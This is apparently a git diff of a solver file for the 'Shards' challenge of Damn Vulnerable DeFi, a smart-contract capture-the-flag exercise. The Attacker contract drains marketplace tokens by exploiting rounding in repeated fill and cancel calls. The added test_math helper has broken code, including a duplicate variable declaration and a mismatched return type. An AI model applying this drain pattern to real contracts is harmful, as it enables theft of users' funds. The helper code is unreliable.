@@ -11,12 +11,17 @@ import {
     DamnValuableNFT
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
+import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
+
 
 contract Attacker {
     ShardsNFTMarketplace immutable marketplace;
     DamnValuableToken immutable token;
     address immutable recovery;
     uint64 public offerId;
+
+    using FixedPointMathLib for uint256;
+
 
     constructor(
         ShardsNFTMarketplace _marketplace,
@@ -33,21 +38,42 @@ contract Attacker {
     function attack() external{
         // Approve max DVT spending (even with 0 balance)
         token.approve(address(marketplace), type(uint256).max);
-        console.log(token.balance(address(this)));
         // 1. Tiny fill with payment = 0 (want < 133)
         marketplace.fill(offerId, 100);
         // 2. Immediately cancel to get a dust refund
         marketplace.cancel(offerId, 0); // first purchase at index 0
-        console.log(token.balance(address(this)));
+        console.log(token.balanceOf(address(this)));
 
         // 3. Use the dust to fill a larger amount (payment ~7.5e12 DVT)
         marketplace.fill(offerId, 1e15);
         // 4. Cancel the second purchase for a massive refund (~75 DVT)
         marketplace.cancel(offerId, 1); // second purchase at index 1
+        console.log(token.balanceOf(address(this)));
 
         // 5. Send all drained tokens to the recovery address
         uint256 balance = token.balanceOf(address(this));
         token.transfer(recovery, balance);
+    }
+
+    function toDVT(uint256 value, uint256 rate) internal pure returns (uint256) {
+        return value.mulDivDown(rate, 1e6);
+    }
+
+    function test_math() public view {
+        uint256 price = marketplace.getOffer(offerId);
+        console.log(price);
+
+        uint256 want = 1e18;
+        uint256 price = 1_000_000e6;
+        uint256 totalShards = 10_000_000e18;
+        uint256 rate = 75e15;
+
+        uint256 payment = want.mulDivDown(
+            toDVT(price, rate),
+            totalShards
+        );
+
+        console2.log("payment =", payment);
     }
 }
 
@@ -154,7 +180,7 @@ contract ShardsChallenge is Test {
      */
     function test_shards() public checkSolvedByPlayer {
       Attacker attacker = new Attacker(ShardsNFTMarketplace(marketplace), token, 1, recovery);
-      attacker.attack();
+      attacker.test_math();
     }
 
     /**
